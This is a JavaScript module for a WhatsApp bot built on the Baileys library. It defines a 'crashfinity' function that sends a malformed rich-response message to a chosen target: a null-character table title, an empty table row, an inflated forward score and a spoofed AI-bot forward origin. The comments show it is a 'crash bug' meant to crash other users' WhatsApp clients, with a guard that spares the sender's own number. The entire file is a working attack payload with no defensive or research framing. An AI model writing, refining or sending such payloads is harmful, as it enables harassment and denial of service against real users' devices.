const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

// ============================================================
// crashnew.js — fixed
// 1. sock passed in as first parameter (matches index.js call)
// 2. sender-JID guard: never targets the paired number itself
// 3. noselfsync + empty additionalAttributes on relayMessage
// 4. exports both "crashnew" and "crashfinity" for compat
// ============================================================

async function crashfinity(sock, target) {
  if (!sock || !target) {
    console.log('[crashnew] missing sock or target — skipping');
    return;
  }

  // ---- Sender guard ----
  // If target resolves to the sender's own number, do nothing.
  // This is what was making bugs hit the paired number too.
  try {
    const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
    const senderNum = senderRaw.split('@')[0].split(':')[0];
    const targetNum = String(target).split('@')[0].split(':')[0];
    if (senderNum && targetNum && senderNum === targetNum) {
      console.log('[crashnew] skipped — target equals sender (' + senderNum + ')');
      return;
    }
  } catch (_) {
    // if anything goes wrong resolving JIDs, fall through and attempt send
  }

  try {
    await sock.relayMessage(
      target,
      {
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              submessages: [
                {
                  messageType: 8,
                  latexMetadata: {
                    text: "Hello This Bazz"
                  }
                },
                {
                  messageType: 4,
                  tableMetadata: {
                    title: "\0",
                    rows: [
                      {
                        items: [],
                        isHeading: false
                      }
                    ]
                  }
                }
              ],
              contextInfo: {
                forwardingScore: 99999,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                  botJid: "867051314767696@bot"
                },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        noselfsync: true,
        useCachedGroupMetadata: false,
        additionalAttributes: {}
      }
    );
  } catch (e) {
    console.log('[crashnew]', (e && e.message) ? e.message : e);
  }
}

module.exports = { crashnew: crashfinity, crashfinity };
